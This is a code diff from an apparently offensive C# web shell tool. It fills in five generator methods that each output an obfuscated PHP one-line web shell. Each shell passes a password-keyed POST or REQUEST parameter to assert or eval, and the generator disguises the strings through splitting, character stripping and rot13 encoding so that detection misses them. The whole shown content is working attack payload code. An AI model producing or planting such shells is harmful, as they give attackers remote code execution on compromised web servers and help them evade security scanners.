@@ -141,23 +141,33 @@ namespace C2.Business.CastleBravo.WebShellTool
   
         private string GenOneWord1(string password)
         {
-            throw new NotImplementedException();
+            // <?php $a=@str_replace(x,'','axsxxsxexrxxt');@$a($_POST['yxs']); ?>
+            return string.Format(@"<?ph" + @"p $a=@str_repl" + @"ace(x,'','axsxxs" + @"xexrxxt');@$a($_POS" + @"T['{0}']); ?>", password);
         }
         private string GenOneWord2(string password)
         {
-            throw new NotImplementedException();
+            // <?php $k="ass"."ert"; @$k(${"_PO"."ST"}['yxs']);?>
+            return "<? php $k" + " = \"ass\".\"e" + "rt\"; @$k(${\"_PO\"." + "\"ST\"}" + string.Format("['{0}']);?>", password);
         }
         private string GenOneWord3(string password)
         {
-            throw new NotImplementedException();
+            // <?php  $a = "a"."s"."s"."e"."r"."t";  @$a($_POST["yxs"]);  ?>
+            return "<?ph" + "p  $a = \"a\".\"s\"." + "\"s\".\"e\"." + "\"r\".\"t\";  @$a($_POST" + string.Format("[\"{0}\"]);  ?>", password);
         }
         private string GenOneWord4(string password)
         {
-            throw new NotImplementedException();
+            // <?php @eval($GLOBALS['_POST']['yxs']); ?>
+            return string.Format("<?php @e" + "val($GLOB" + "ALS['_POST" + "']['{0}']); ?>", password);
         }
         private string GenOneWord5(string password)
         {
-            throw new NotImplementedException();
+            // <?php function xm($a){$c=str_rot13('nffreg');$c($a);}xm($_REQUEST['yxs']);?>
+            StringBuilder sb = new StringBuilder();
+            sb.Append("<?php function xm")
+              .Append("($a){$c=str_rot13('nffreg');")
+              .Append("$c($a);}xm($_REQUEST")
+              .Append(string.Format("['{0}']); ?>", password));
+            return sb.ToString();
         }
         private string GenOneWord6(string password)
         {
